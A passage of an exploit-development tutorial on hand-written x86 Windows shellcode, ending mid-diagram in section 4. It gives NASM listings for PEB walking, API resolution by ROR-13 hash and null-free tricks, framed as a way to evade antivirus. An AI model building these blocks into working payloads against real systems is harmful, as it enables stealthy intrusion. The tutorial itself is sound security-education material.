---
title: "x86 Windows Shellcoding: From Zero to Custom Payloads"
date: 2026-11-09 00:00:00 +0300
categories: [Exploit Development, Shellcoding]
tags: [x86, shellcoding, windows, assembly, exploit-development]
description: "A comprehensive guide to writing custom x86 Windows shellcode — from PEB walking and API resolution to reverse shells, process injection, and beyond."
---

In this series, we will build a fully custom Windows reverse shell in x86 assembly -- from zero to a working payload. No frameworks, no Metasploit, just raw assembly and a deep understanding of how Windows works under the hood.

Why bother? Because pre-built shellcode is the first thing antivirus signatures target. When we write our own, we control every byte: the size, the encoding, the bad characters we avoid, and the tricks we use to stay invisible. That understanding is what separates someone who *uses* tools from someone who *builds* them.

Let's get started.

## Table of Contents

**Part I -- Foundations**
1. [What Is Shellcode?](#1-what-is-shellcode)
2. [The Shellcode Skeleton](#2-the-shellcode-skeleton)
3. [Walking the PEB -- Finding kernel32.dll](#3-walking-the-peb-finding-kernel32dll)
4. [The find_function Engine -- Resolving API Addresses](#4-the-findfunction-engine-resolving-api-addresses)

**Part II -- Building Blocks**
5. [Null-Free Encoding Patterns](#5-null-free-encoding-patterns)
6. [Building Strings on the Stack](#6-building-strings-on-the-stack)
7. [The ROR-13 Hash Generator](#7-the-ror-13-hash-generator)
8. [Testing Shellcode -- Keystone and ctypes](#8-testing-shellcode-keystone-and-ctypes)

**Part III -- Payloads**
9. [Your First Shellcode -- WinExec](#9-your-first-shellcode-winexec)
10. [Reverse Shell -- Calling Home](#10-reverse-shell-calling-home)
11. [Bind Shell -- Waiting for Connections](#11-bind-shell-waiting-for-connections)
12. [Working Under Restrictions -- A Case Study](#12-working-under-restrictions-a-case-study)

**Part IV -- Advanced Techniques**
13. [Socket Reuse -- Hijacking Existing Connections](#13-socket-reuse-hijacking-existing-connections)
14. [XOR Encoding -- Runtime Decoding](#14-xor-encoding-runtime-decoding)
15. [Process Injection -- Running In Another Process](#15-process-injection-running-in-another-process)
16. [HTTP Stager -- Downloading Second Stage](#16-http-stager-downloading-second-stage)
17. [Registry Persistence -- Surviving Reboots](#17-registry-persistence-surviving-reboots)

**Part V -- File Operations and Workflow**
18. [SMB File Operations -- Network File Access](#18-smb-file-operations-network-file-access)
19. [File I/O -- Writing to Disk](#19-file-io-writing-to-disk)
20. [The Complete Development Workflow](#20-the-complete-development-workflow)
21. [Mitigations, Ethics, and Closing Thoughts](#21-mitigations-ethics-and-closing-thoughts)

---

## 1. What Is Shellcode?

**Shellcode** is a small, self-contained block of machine code designed to be injected into a running process and executed directly. The name comes from its original purpose -- spawning a shell -- but modern shellcode can do anything: download files, add user accounts, open reverse connections, or disable security software.

What makes shellcode different from a normal compiled program?

- **No loader.** When Windows runs an `.exe`, the PE loader resolves imports, fixes up addresses, and sets up memory sections. Shellcode gets none of that. It lands in memory at an unpredictable address and must figure everything out itself.
- **No null bytes** (usually). Shellcode is often delivered through string-handling functions like `strcpy()` that stop at `0x00`. A single null byte truncates our payload. We must encode around them.
- **No hardcoded addresses.** DLLs load at different addresses thanks to ASLR. Shellcode must locate every API function it needs at runtime.

This last point is critical. Our shellcode must be **position-independent code (PIC)** -- it works regardless of where in memory it lands. Every address we need, we compute on the fly.

### x86 Primer: The Registers We Care About

Before we dive into assembly, let's establish the registers we will use constantly throughout this series.

**General-purpose registers:**

| Register | Conventional Use | Our Use |
|----------|-----------------|---------|
| **EAX** | Return values, accumulator | Function return values, scratch math |
| **EBX** | Base register (callee-saved) | DLL base addresses |
| **ECX** | Counter for loops | Loop counters, string lengths |
| **EDX** | Data, I/O operations | Hash accumulator, scratch |
| **ESI** | Source index for string ops | Source pointers, PEB traversal |
| **EDI** | Destination index | Destination pointers, PE table pointers |
| **EBP** | Base/frame pointer | **Our variable table** (key design choice) |
| **ESP** | Stack pointer | Top of stack (grows downward) |

> **Key concept:** The x86 stack grows *downward* in memory. `push eax` decrements ESP by 4, then writes EAX at the new ESP. `pop eax` reads from ESP, then increments by 4.

**Calling convention (cdecl/stdcall):** Windows API functions use **stdcall** -- arguments are pushed onto the stack right-to-left, the callee cleans up the stack, and the return value lands in EAX. So to call `SomeFunction(arg1, arg2, arg3)`, we push `arg3`, then `arg2`, then `arg1`, then `call`.

With those fundamentals in place, let's build the skeleton that every piece of our shellcode will hang from.

---

## 2. The Shellcode Skeleton

Every shellcode we write in this series starts with the same two instructions. They look simple, but the reasoning behind them is worth understanding fully.

```nasm
start:
    mov   ebp, esp          ; Anchor our variable table
    add   esp, 0xfffff9f0   ; Carve out stack space (null-free)
```

### Anchoring EBP as Our Variable Table

The first instruction, `mov ebp, esp`, captures the current top of the stack into EBP. From this point forward, **EBP becomes our fixed reference point** -- a personal variable table where we store every resolved API address and piece of data we need.

Why EBP? Because in normal compiled code, EBP is the frame pointer -- it points to a stable location in the stack frame while ESP moves around with every push and pop. We exploit that same stability. No matter how much we push and pop during execution, EBP never moves.

Our variable table layout:

| Offset | Contents |
|--------|----------|
| `[ebp+0x04]` | Address of `find_function` (our API resolver) |
| `[ebp+0x08]` | Resolved address of first API (e.g., `LoadLibraryA`) |
| `[ebp+0x0C]` | Resolved address of second API (e.g., `CreateProcessA`) |
| `[ebp+0x10]` | Resolved address of third API (e.g., `ExitProcess`) |
| `[ebp+0x14]` | ... and so on for every API we need |

We simply `mov [ebp+0x08], eax` after resolving an API, and later `call dword ptr [ebp+0x08]` to invoke it. Clean, predictable, and easy to extend.

### Carving Stack Space Without Null Bytes

The second instruction is where things get clever:

```nasm
add   esp, 0xfffff9f0   ; ESP = ESP - 0x610 (1552 bytes)
```

Wait -- we are *adding* to ESP to move it *down*? Yes. Let's work through the math.

We want to subtract `0x610` (1552 decimal) from ESP to reserve stack space. But `sub esp, 0x610` would assemble with null bytes in the immediate value (`0x00000610`). Those nulls would kill our shellcode in most injection scenarios.

Instead, we use **two's complement arithmetic**. The two's complement of `0x610` is:

```
0x00000610  -->  NOT  -->  0xFFFFF9EF  -->  +1  -->  0xFFFFF9F0
```

So `0xFFFFF9F0` is the two's complement representation of `-0x610`. Adding a negative number is the same as subtracting the positive:

```
ESP + 0xFFFFF9F0 = ESP - 0x610
```

The value `0xFFFFF9F0` contains no null bytes. Problem solved.

> **Why 1552 bytes?** Our shellcode will push structures onto the stack -- `STARTUPINFOA` (68 bytes), `PROCESS_INFORMATION` (16 bytes), `WSADATA` (400 bytes), `sockaddr_in` (16 bytes), plus all the API arguments. 1552 bytes gives us comfortable room without being wasteful. In constrained environments, you can tune this down.

### Visualizing the Stack Layout

Here is how memory looks after these two instructions execute:

<div align="center"><svg viewBox="0 0 750 480" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: Consolas, monospace;">
  <defs>
    <marker id="arrowDown" markerWidth="10" markerHeight="7" refX="5" refY="7" orient="auto">
      <polygon points="0,0 10,0 5,7" fill="#a6e3a1"/>
    </marker>
    <marker id="arrowRight" markerWidth="7" markerHeight="10" refX="7" refY="5" orient="auto">
      <polygon points="0,0 7,5 0,10" fill="#89b4fa"/>
    </marker>
    <marker id="arrowLeft" markerWidth="7" markerHeight="10" refX="0" refY="5" orient="auto">
      <polygon points="7,0 0,5 7,10" fill="#89b4fa"/>
    </marker>
  </defs>
  <rect width="750" height="480" rx="8" fill="#1e1e2e"/>
  <text x="375" y="30" text-anchor="middle" fill="#cdd6f4" font-size="15" font-weight="bold">Stack Layout After Skeleton Setup</text>
  <text x="60" y="55" fill="#6c7086" font-size="11">HIGH MEMORY</text>
  <rect x="180" y="70" width="320" height="40" rx="4" fill="#313244" stroke="#f38ba8" stroke-width="2"/>
  <text x="340" y="95" text-anchor="middle" fill="#f38ba8" font-size="13" font-weight="bold">EBP (original ESP)</text>
  <rect x="180" y="115" width="320" height="32" rx="4" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/>
  <text x="340" y="136" text-anchor="middle" fill="#cdd6f4" font-size="12">[ebp+0x04] = find_function addr</text>
  <rect x="180" y="150" width="320" height="32" rx="4" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/>
  <text x="340" y="171" text-anchor="middle" fill="#cdd6f4" font-size="12">[ebp+0x08] = LoadLibraryA</text>
  <rect x="180" y="185" width="320" height="32" rx="4" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/>
  <text x="340" y="206" text-anchor="middle" fill="#cdd6f4" font-size="12">[ebp+0x0C] = CreateProcessA</text>
  <rect x="180" y="220" width="320" height="32" rx="4" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/>
  <text x="340" y="241" text-anchor="middle" fill="#cdd6f4" font-size="12">[ebp+0x10] = ExitProcess</text>
  <rect x="180" y="255" width="320" height="32" rx="4" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/>
  <text x="340" y="276" text-anchor="middle" fill="#cdd6f4" font-size="12">[ebp+0x14] ... more APIs ...</text>
  <rect x="180" y="295" width="320" height="100" rx="4" fill="#313244" stroke="#a6e3a1" stroke-width="1.5" stroke-dasharray="6,3"/>
  <text x="340" y="340" text-anchor="middle" fill="#a6e3a1" font-size="13">~1552 bytes free space</text>
  <text x="340" y="360" text-anchor="middle" fill="#6c7086" font-size="11">(structures, arguments, strings)</text>
  <rect x="180" y="400" width="320" height="40" rx="4" fill="#313244" stroke="#f38ba8" stroke-width="2"/>
  <text x="340" y="425" text-anchor="middle" fill="#f38ba8" font-size="13" font-weight="bold">ESP (after add esp, 0xfffff9f0)</text>
  <text x="60" y="455" fill="#6c7086" font-size="11">LOW MEMORY</text>
  <text x="550" y="93" fill="#f38ba8" font-size="12">EBP --></text>
  <text x="550" y="423" fill="#f38ba8" font-size="12">ESP --></text>
  <line x1="140" y1="90" x2="140" y2="420" stroke="#a6e3a1" stroke-width="2" marker-end="url(#arrowDown)"/>
  <text x="70" y="260" fill="#a6e3a1" font-size="11" text-anchor="middle" transform="rotate(-90, 70, 260)">0x610 bytes</text>
  <text x="670" y="250" fill="#6c7086" font-size="11" transform="rotate(90, 670, 250)">Stack grows down</text>
</svg></div>

*Figure 2.1 - The shellcode skeleton creates a fixed variable table at EBP and reserves 1552 bytes of working space below it. Positive offsets from EBP store resolved API addresses; the free space below holds structures and arguments during API calls.*

This two-instruction skeleton is the foundation we will never change. Everything else builds on top of it.

---

## 3. Walking the PEB -- Finding kernel32.dll

Our shellcode needs to call Windows API functions like `LoadLibraryA`, `CreateProcessA`, and `WSAStartup`. But where are they? They live in DLLs, and DLLs load at unpredictable addresses. So the first thing we must do is find the base address of **kernel32.dll** -- the DLL that exports the most essential Windows APIs.

Windows gives us a way in: the **Process Environment Block (PEB)**. Every running process has one, and it contains a linked list of every loaded module (DLL) along with their base addresses. Better yet, access to the PEB requires no API calls at all -- it is reachable through a segment register.

### The Chain: TEB to PEB to Modules

Here is the chain we follow:

1. **Thread Environment Block (TEB):** On x86 Windows, the `FS` segment register always points to the TEB of the current thread. At offset `0x30` within the TEB sits a pointer to the PEB.

2. **PEB (Process Environment Block):** At offset `0x0C` within the PEB sits a pointer to `PEB_LDR_DATA` -- the loader data structure.

3. **PEB_LDR_DATA:** This structure contains three doubly-linked lists of loaded modules, each ordered differently:
   - `InLoadOrderModuleList` (offset `0x0C`) -- order they were loaded
   - `InMemoryOrderModuleList` (offset `0x14`) -- order in memory
   - `InInitializationOrderModuleList` (offset `0x1C`) -- order they were initialized

4. **Module entries:** Each node in the list is an `LDR_DATA_TABLE_ENTRY`. From the entry we can read the DLL base address and its name.

> **Which list should we use?** Both `InInitializationOrderModuleList` (offset `0x1C`) and `InMemoryOrderModuleList` (offset `0x14`) work. The initialization-order list typically gives us: ntdll.dll first, then kernelbase.dll (on modern Windows), then kernel32.dll. The code below uses the initialization-order list; the offsets for base address and module name differ between the two lists, so pay attention to which one your code targets.

### The Assembly

```nasm
find_kernel32:
    xor   ecx, ecx              ; ECX = 0 (also clears for later cmp)
    mov   esi, fs:[ecx+0x30]    ; ESI = PEB address (TEB->PEB at offset 0x30)
    mov   esi, [esi+0x0C]       ; ESI = PEB->Ldr (PEB_LDR_DATA)
    mov   esi, [esi+0x1C]       ; ESI = Ldr->InInitializationOrderModuleList

next_module:
    mov   ebx, [esi+0x08]       ; EBX = module base address
    mov   edi, [esi+0x20]       ; EDI = pointer to module name (Unicode)
    mov   esi, [esi]            ; ESI = Flink (next entry in the list)
    cmp   [edi+12*2], cx        ; Is the 13th Unicode char null?
    jne   next_module           ; No -- try the next module
```

Let's walk through every instruction.

**`xor ecx, ecx`** -- We zero out ECX. Why not `mov ecx, 0`? Because that assembles as `B9 00 00 00 00` -- four null bytes. `xor ecx, ecx` assembles as `31 C9` -- two bytes, no nulls. We will also reuse the zero in CX for the string comparison later.

**`mov esi, fs:[ecx+0x30]`** -- This reads the PEB pointer from the TEB. We write `fs:[ecx+0x30]` instead of `fs:[0x30]` because some assemblers encode a bare `fs:[0x30]` with a null-containing displacement. Using `ecx+0x30` (where ECX is zero) avoids that.

**`mov esi, [esi+0x0C]`** -- We dereference the PEB to get `PEB_LDR_DATA`. The `Ldr` field is at offset `0x0C` within the PEB.

**`mov esi, [esi+0x1C]`** -- We follow the `InInitializationOrderModuleList` head pointer at offset `0x1C` within `PEB_LDR_DATA`. ESI now points to the first entry in the linked list.

**`mov ebx, [esi+0x08]`** -- From the current list entry, we grab the base address of the loaded module. For `InInitializationOrderModuleList`, the base address lives at offset `0x08`.

**`mov edi, [esi+0x20]`** -- We grab the pointer to the module's name string (Unicode, UTF-16LE). This is at offset `0x20` from the list entry.

**`mov esi, [esi]`** -- We advance ESI to the next entry in the linked list (the Flink pointer is at offset `0x00`). We do this *before* the comparison because if this module is not kernel32.dll, we need ESI already pointing to the next entry.

**`cmp [edi+12*2], cx`** -- Here is the identification trick. The string `kernel32.dll` has exactly 12 characters. In Unicode (UTF-16LE), each character is 2 bytes, so the 13th character (index 12) is at byte offset `12 * 2 = 24`. For `kernel32.dll`, that 13th character is the null terminator (`0x0000`). CX is still zero from our earlier `xor ecx, ecx`, so this comparison checks: "Does this module name have exactly 12 characters?" That uniquely identifies `kernel32.dll` among the typically loaded modules.

**`jne next_module`** -- If the comparison fails, this is not our module. Loop to the next one.

When the loop exits, **EBX holds the base address of kernel32.dll**. This is the crucial value that the rest of our shellcode depends on.

### Visualizing the PEB Walk

<div align="center"><svg viewBox="0 0 750 420" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: Consolas, monospace;">
  <defs>
    <marker id="arrow1" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto">
      <polygon points="0,0 8,3 0,6" fill="#a6e3a1"/>
    </marker>
    <marker id="arrow2" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto">
      <polygon points="0,0 8,3 0,6" fill="#89b4fa"/>
    </marker>
  </defs>
  <rect width="750" height="420" rx="8" fill="#1e1e2e"/>
  <text x="375" y="28" text-anchor="middle" fill="#cdd6f4" font-size="15" font-weight="bold">PEB Walk: Finding kernel32.dll Base Address</text>
  <rect x="20" y="55" width="120" height="70" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="2"/>
  <text x="80" y="78" text-anchor="middle" fill="#89b4fa" font-size="13" font-weight="bold">TEB</text>
  <text x="80" y="100" text-anchor="middle" fill="#cdd6f4" font-size="11">fs:[0x30]</text>
  <text x="80" y="116" text-anchor="middle" fill="#6c7086" font-size="10">--> PEB ptr</text>
  <line x1="140" y1="90" x2="190" y2="90" stroke="#a6e3a1" stroke-width="2" marker-end="url(#arrow1)"/>
  <rect x="195" y="55" width="130" height="70" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="2"/>
  <text x="260" y="78" text-anchor="middle" fill="#89b4fa" font-size="13" font-weight="bold">PEB</text>
  <text x="260" y="100" text-anchor="middle" fill="#cdd6f4" font-size="11">[PEB+0x0C]</text>
  <text x="260" y="116" text-anchor="middle" fill="#6c7086" font-size="10">--> Ldr ptr</text>
  <line x1="325" y1="90" x2="380" y2="90" stroke="#a6e3a1" stroke-width="2" marker-end="url(#arrow1)"/>
  <rect x="385" y="45" width="175" height="85" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="2"/>
  <text x="472" y="68" text-anchor="middle" fill="#89b4fa" font-size="13" font-weight="bold">PEB_LDR_DATA</text>
  <text x="472" y="88" text-anchor="middle" fill="#cdd6f4" font-size="10">[+0x0C] InLoadOrder</text>
  <text x="472" y="103" text-anchor="middle" fill="#cdd6f4" font-size="10">[+0x14] InMemoryOrder</text>
  <text x="472" y="118" text-anchor="middle" fill="#f38ba8" font-size="10" font-weight="bold">[+0x1C] InInitOrder</text>
  <line x1="560" y1="118" x2="560" y2="165" stroke="#a6e3a1" stroke-width="2" marker-end="url(#arrow1)"/>
  <rect x="30" y="175" width="200" height="90" rx="6" fill="#313244" stroke="#fab387" stroke-width="1.5"/>
  <text x="130" y="198" text-anchor="middle" fill="#fab387" font-size="12" font-weight="bold">ntdll.dll</text>
  <text x="130" y="218" text-anchor="middle" fill="#cdd6f4" font-size="10">[+0x08] BaseAddr = 0x7C9...</text>
  <text x="130" y="235" text-anchor="middle" fill="#cdd6f4" font-size="10">[+0x20] Name = "ntdll.dll"</text>
  <text x="130" y="255" text-anchor="middle" fill="#6c7086" font-size="10">name[12*2] != 0 --> skip</text>
  <rect x="275" y="175" width="200" height="90" rx="6" fill="#313244" stroke="#fab387" stroke-width="1.5"/>
  <text x="375" y="198" text-anchor="middle" fill="#fab387" font-size="12" font-weight="bold">kernelbase.dll</text>
  <text x="375" y="218" text-anchor="middle" fill="#cdd6f4" font-size="10">[+0x08] BaseAddr = 0x75E...</text>
  <text x="375" y="235" text-anchor="middle" fill="#cdd6f4" font-size="10">[+0x20] Name = "KERNELBASE..."</text>
  <text x="375" y="255" text-anchor="middle" fill="#6c7086" font-size="10">name[12*2] != 0 --> skip</text>
  <rect x="520" y="175" width="200" height="90" rx="6" fill="#313244" stroke="#f38ba8" stroke-width="2.5"/>
  <text x="620" y="198" text-anchor="middle" fill="#f38ba8" font-size="12" font-weight="bold">kernel32.dll</text>
  <text x="620" y="218" text-anchor="middle" fill="#a6e3a1" font-size="10" font-weight="bold">[+0x08] BaseAddr --> EBX</text>
  <text x="620" y="235" text-anchor="middle" fill="#cdd6f4" font-size="10">[+0x20] Name = "kernel32.dll"</text>
  <text x="620" y="255" text-anchor="middle" fill="#a6e3a1" font-size="10">name[12*2] == 0 --> MATCH!</text>
  <line x1="230" y1="220" x2="275" y2="220" stroke="#89b4fa" stroke-width="2" marker-end="url(#arrow2)"/>
  <text x="252" y="212" text-anchor="middle" fill="#89b4fa" font-size="9">flink</text>
  <line x1="475" y1="220" x2="520" y2="220" stroke="#89b4fa" stroke-width="2" marker-end="url(#arrow2)"/>
  <text x="497" y="212" text-anchor="middle" fill="#89b4fa" font-size="9">flink</text>
  <line x1="560" y1="165" x2="130" y2="175" stroke="#a6e3a1" stroke-width="1.5" stroke-dasharray="5,3" marker-end="url(#arrow1)"/>
  <rect x="80" y="300" width="590" height="100" rx="6" fill="#1e1e2e" stroke="#6c7086" stroke-width="1" stroke-dasharray="4,4"/>
  <text x="375" y="322" text-anchor="middle" fill="#cdd6f4" font-size="12" font-weight="bold">Module Identification: Why cmp [edi+12*2], cx Works</text>
  <text x="375" y="345" text-anchor="middle" fill="#cdd6f4" font-size="11">"kernel32.dll" = 12 chars. In UTF-16LE, char index 12 = byte offset 24.</text>
  <text x="375" y="365" text-anchor="middle" fill="#cdd6f4" font-size="11">The 13th character of "kernel32.dll" is the null terminator (0x0000).</text>
  <text x="375" y="385" text-anchor="middle" fill="#a6e3a1" font-size="11">"ntdll.dll" has 9 chars, "kernelbase.dll" has 14 --> neither matches.</text>
</svg></div>

*Figure 3.1 - The PEB walk follows a chain of pointers from the TEB segment register through the PEB and loader data to a linked list of loaded modules. We identify kernel32.dll by checking that its 13th Unicode character is the null terminator -- a property unique to a 12-character module name.*

---

## 4. The find_function Engine -- Resolving API Addresses

We now have kernel32.dll's base address in EBX. But a base address alone does not let us call functions. We need the exact virtual address of functions like `LoadLibraryA` and `CreateProcessA`. To get those, we must parse the **PE Export Table** -- the part of a DLL that says "here are the functions I export, and here is where each one lives in memory."

But first, we need to solve a bootstrapping problem: how does our shellcode reference its own internal function (`find_function`) when it does not know its own address?

### JMP/CALL/POP: Getting Our Own Address

This is one of the most elegant tricks in shellcode writing. The x86 `CALL` instruction does two things: it pushes the address of the *next* instruction onto the stack, then jumps to the target. We can exploit this to capture an address.

```nasm
find_function_shorten:
    jmp   find_function_shorten_bnc    ; (1) Jump forward

find_function_ret:
    pop   esi                          ; (3) ESI = address of find_function
    mov   [ebp+0x04], esi              ; (4) Save it in our variable table
    jmp   resolve_symbols_kernel32     ; (5) Continue to symbol resolution

find_function_shorten_bnc:
    call  find_function_ret            ; (2) CALL backward -- pushes addr of find_function

find_function:                         ; <-- this is the address CALL pushed
    pushad
    ; ... (the actual function body)
```

Here is the control flow step by step:

1. **JMP forward** over the `find_function_ret` block to `find_function_shorten_bnc`.
2. **CALL backward** to `find_function_ret`. The CALL instruction pushes the address of the *next* instruction -- which is `find_function` itself -- onto the stack.
3. **POP ESI** grabs that address off the stack. Now ESI holds the exact runtime address of `find_function`.
4. **Save it** at `[ebp+0x04]` so we can call it later with `call dword ptr [ebp+0x04]`.
5. **JMP** to the main code flow to start resolving symbols.

<div align="center"><svg viewBox="0 0 750 340" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: Consolas, monospace;">
  <defs>
    <marker id="arrowG" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto">
      <polygon points="0,0 8,3 0,6" fill="#a6e3a1"/>
    </marker>
    <marker id="arrowO" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto">
      <polygon points="0,0 8,3 0,6" fill="#fab387"/>
    </marker>
  </defs>
  <rect width="750" height="340" rx="8" fill="#1e1e2e"/>
  <text x="375" y="28" text-anchor="middle" fill="#cdd6f4" font-size="15" font-weight="bold">JMP / CALL / POP Control Flow</text>
  <rect x="30" y="55" width="240" height="42" rx="5" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/>
  <text x="40" y="73" fill="#6c7086" font-size="10">find_function_shorten:</text>
  <text x="50" y="89" fill="#cdd6f4" font-size="12">jmp find_function_shorten_bnc</text>
  <rect x="30" y="110" width="240" height="72" rx="5" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/>
  <text x="40" y="128" fill="#6c7086" font-size="10">find_function_ret:</text>
  <text x="50" y="146" fill="#cdd6f4" font-size="12">pop esi</text>
  <text x="50" y="162" fill="#cdd6f4" font-size="12">mov [ebp+0x04], esi</text>
  <text x="50" y="178" fill="#cdd6f4" font-size="12">jmp resolve_symbols...</text>
  <rect x="30" y="195" width="240" height="42" rx="5" fill="#313244" stroke="#fab387" stroke-width="2"/>
  <text x="40" y="213" fill="#6c7086" font-size="10">find_function_shorten_bnc:</text>
  <text x="50" y="229" fill="#fab387" font-size="12" font-weight="bold">call find_function_ret</text>
  <rect x="30" y="250" width="240" height="42" rx="5" fill="#313244" stroke="#f38ba8" stroke-width="2"/>
  <text x="40" y="268" fill="#6c7086" font-size="10">find_function:</text>
  <text x="50" y="284" fill="#f38ba8" font-size="12" font-weight="bold">pushad ; ... (body)</text>
  <path d="M 270,76 C 330,76 330,216 270,216" fill="none" stroke="#a6e3a1" stroke-width="2" marker-end="url(#arrowG)"/>
  <rect x="300" y="130" width="60" height="24" rx="4" fill="#1e1e2e"/>
  <text x="330" y="147" text-anchor="middle" fill="#a6e3a1" font-size="13" font-weight="bold">(1) JMP</text>
  <path d="M 270,216 C 380,216 380,145 270,145" fill="none" stroke="#fab387" stroke-width="2" marker-end="url(#arrowO)"/>
  <rect x="350" y="165" width="78" height="24" rx="4" fill="#1e1e2e"/>
  <text x="389" y="182" text-anchor="middle" fill="#fab387" font-size="13" font-weight="bold">(2) CALL</text>
  <rect x="490" y="195" width="235" height="95" rx="6" fill="#313244" stroke="#fab387" stroke-width="1.5"/>
  <text x="607" y="215" text-anchor="middle" fill="#fab387" font-size="12" font-weight="bold">CALL pushes onto stack:</text>
  <text x="607" y="240" text-anchor="middle" fill="#cdd6f4" font-size="12">address of next instruction</text>
  <text x="607" y="260" text-anchor="middle" fill="#cdd6f4" font-size="12">= address of find_function</text>
  <text x="607" y="280" text-anchor="middle" fill="#a6e3a1" font-size="11">(3) POP ESI retrieves it!</text>
  <line x1="430" y1="216" x2="490" y2="240" stroke="#fab387" stroke-width="1.5" stroke-dasharray="4,3" marker-end="url(#arrowO)"/>
  <rect x="490" y="55" width="235" height="65" rx="6" fill="#313244" stroke="#a6e3a1" stroke-width="1.5"/>
  <text x="607" y="78" text-anchor="middle" fill="#a6e3a1" font-size="12">(4) Save at [ebp+0x04]</text>
  <text x="607" y="100" text-anchor="middle" fill="#a6e3a1" font-size="12">(5) JMP to main code flow</text>
</svg></div>

*Figure 4.1 - The JMP/CALL/POP trick exploits the fact that CALL pushes the next instruction's address onto the stack. By placing CALL just before find_function, we capture find_function's runtime address via POP, without needing any hardcoded addresses.*

### Parsing the PE Export Table

Now let's look at the `find_function` body itself. When we call it, EBX contains the base address of the target DLL, and a 4-byte hash of the desired function name has been pushed onto the stack.

The PE Export Table has a structure called `IMAGE_EXPORT_DIRECTORY` that contains three parallel arrays:

- **AddressOfNames** -- an array of RVAs pointing to the ASCII name of each exported function
- **AddressOfNameOrdinals** -- an array of 16-bit ordinals, one per name, that index into...
- **AddressOfFunctions** -- an array of RVAs pointing to the actual function code

Here is the complete `find_function` code:

```nasm
find_function:
    pushad                          ; Save all 8 registers (32 bytes on stack)
    mov   eax, [ebx+0x3c]          ; EAX = offset to PE signature
    mov   edi, [ebx+eax+0x78]      ; EDI = Export Table RVA (PE+0x78)
    add   edi, ebx                  ; EDI = Export Table VA (RVA + base)
    mov   ecx, [edi+0x18]          ; ECX = NumberOfNames (our loop counter)
    mov   eax, [edi+0x20]          ; EAX = AddressOfNames RVA
    add   eax, ebx                  ; EAX = AddressOfNames VA
    mov   [ebp-4], eax              ; Save AddressOfNames VA for the loop

find_function_loop:
    jecxz find_function_finished    ; If ECX == 0, we exhausted all names
    dec   ecx                       ; Decrement counter (we iterate backward)
    mov   eax, [ebp-4]              ; Restore AddressOfNames VA
    mov   esi, [eax+ecx*4]          ; ESI = RVA of the current function name
    add   esi, ebx                  ; ESI = VA of the current function name

compute_hash:
    xor   eax, eax                  ; EAX = 0
    cdq                             ; EDX = 0 (sign-extend EAX into EDX)
    cld                             ; Clear direction flag (LODSB goes forward)

compute_hash_again:
    lodsb                           ; AL = next byte from [ESI], ESI++
    test  al, al                    ; Is it the null terminator?
    jz    compute_hash_finished     ; Yes -- hash is complete
    ror   edx, 0x0d                 ; Rotate EDX right by 13 bits
    add   edx, eax                  ; Add current character to hash
    jmp   compute_hash_again        ; Next character

compute_hash_finished:
find_function_compare:
    cmp   edx, [esp+0x24]          ; Compare hash with the requested hash
    jnz   find_function_loop        ; No match -- try next name
    mov   edx, [edi+0x24]          ; EDX = AddressOfNameOrdinals RVA
    add   edx, ebx                  ; EDX = AddressOfNameOrdinals VA
    mov   cx, [edx+2*ecx]          ; CX = ordinal for this name (16-bit)
    mov   edx, [edi+0x1c]          ; EDX = AddressOfFunctions RVA
    add   edx, ebx                  ; EDX = AddressOfFunctions VA
    mov   eax, [edx+4*ecx]         ; EAX = function RVA (indexed by ordinal)
    add   eax, ebx                  ; EAX = function VA (final address!)
    mov   [esp+0x1c], eax          ; Overwrite saved EAX in pushad frame

find_function_finished:
    popad                           ; Restore all registers (EAX = resolved address)
    ret                             ;
```

**The ROR-13 Hash:** Instead of comparing full function name strings, we use a compact hash. The algorithm rotates the accumulator right by 13 bits before adding each character. The result is a 32-bit hash that is (for practical purposes) unique per function name. For example:
- `TerminateProcess` hashes to `0x78b5b983`
- `LoadLibraryA` hashes to `0xec0e4e8e`
- `CreateProcessA` hashes to `0x16b3fe72`

**The `[esp+0x24]` magic:** The caller does `push hash; call [ebp+0x04]`. The `call` pushes a 4-byte return address. Then `pushad` saves 8 registers (32 = `0x20` bytes). So the hash is at `ESP + 0x20 + 0x04 = ESP + 0x24`.

**The pushad frame trick:** Writing to `[esp+0x1c]` overwrites the saved EAX in the pushad frame. When `popad` restores all registers, EAX magically contains our resolved function address.

### Using find_function

```nasm
resolve_symbols_kernel32:
    push  0x78b5b983                ; Hash of "TerminateProcess"
    call  dword ptr [ebp+0x04]     ; Call find_function
    mov   [ebp+0x10], eax          ; Save resolved address

    push  0xec0e4e8e                ; Hash of "LoadLibraryA"
    call  dword ptr [ebp+0x04]     ; Call find_function
    mov   [ebp+0x14], eax          ; Save resolved address
```

Push the hash, call the engine, store the result. Three lines per API.

<div align="center"><svg viewBox="0 0 750 440" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: Consolas, monospace;">
  <defs>
    <marker id="arwB" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto"><polygon points="0,0 8,3 0,6" fill="#89b4fa"/></marker>
    <marker id="arwG" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto"><polygon points="0,0 8,3 0,6" fill="#a6e3a1"/></marker>
    <marker id="arwR" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto"><polygon points="0,0 8,3 0,6" fill="#f38ba8"/></marker>
  </defs>
  <rect width="750" height="440" rx="8" fill="#1e1e2e"/>
  <text x="375" y="25" text-anchor="middle" fill="#cdd6f4" font-size="15" font-weight="bold">PE Export Table: Three-Array Cross-Reference</text>
  <rect x="250" y="42" width="250" height="60" rx="5" fill="#313244" stroke="#89b4fa" stroke-width="2"/>
  <text x="375" y="62" text-anchor="middle" fill="#89b4fa" font-size="12" font-weight="bold">IMAGE_EXPORT_DIRECTORY</text>
